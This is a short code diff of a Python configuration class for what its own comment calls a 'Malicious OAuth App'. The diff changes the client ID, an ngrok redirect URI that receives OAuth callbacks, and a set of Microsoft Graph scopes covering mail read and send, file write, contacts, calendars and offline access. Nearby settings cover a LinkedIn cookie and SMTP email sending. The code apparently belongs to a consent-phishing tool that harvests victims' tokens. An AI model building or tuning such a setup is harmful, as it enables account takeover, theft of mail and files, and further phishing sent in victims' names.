@@ -58,9 +58,9 @@ class Config:
     linkedin_cookie: str = os.getenv("LINKEDIN_COOKIE", "")  # Optional: Use cookie instead of API
     
     # Malicious OAuth App Configuration
-    oauth_client_id: str = os.getenv("OAUTH_CLIENT_ID", "9aa62102-7d9a-45b0-91f3-e8965341dbc7")
-    oauth_redirect_uri: str = os.getenv("OAUTH_REDIRECT_URI", "https://a91c-128-197-28-178.ngrok-free.app/oauth/callback")
-    oauth_scopes: str = os.getenv("OAUTH_SCOPES", "Files.Read.All Files.ReadWrite Files.ReadWrite.All Mail.Read Mail.ReadWrite offline_access User.Read Application.ReadWrite.All Directory.ReadWrite.All Mail.Send Calendars.ReadWrite Contacts.ReadWrite")
+    oauth_client_id: str = os.getenv("OAUTH_CLIENT_ID", "756b1e2d-0cd5-4ada-8bcc-a415b949216e")
+    oauth_redirect_uri: str = os.getenv("OAUTH_REDIRECT_URI", "https://2ea6-2601-19b-d86-32d0-a4be-e233-f83a-da23.ngrok-free.app/oauth/callback")
+    oauth_scopes: str = os.getenv("OAUTH_SCOPES", "offline_access User.Read Mail.ReadWrite Mail.Send Files.ReadWrite Contacts.ReadWrite Calendars.ReadWrite")
     
     # SMTP Configuration for sending emails
     smtp_server: str = os.getenv("SMTP_SERVER", "smtp.office365.com")
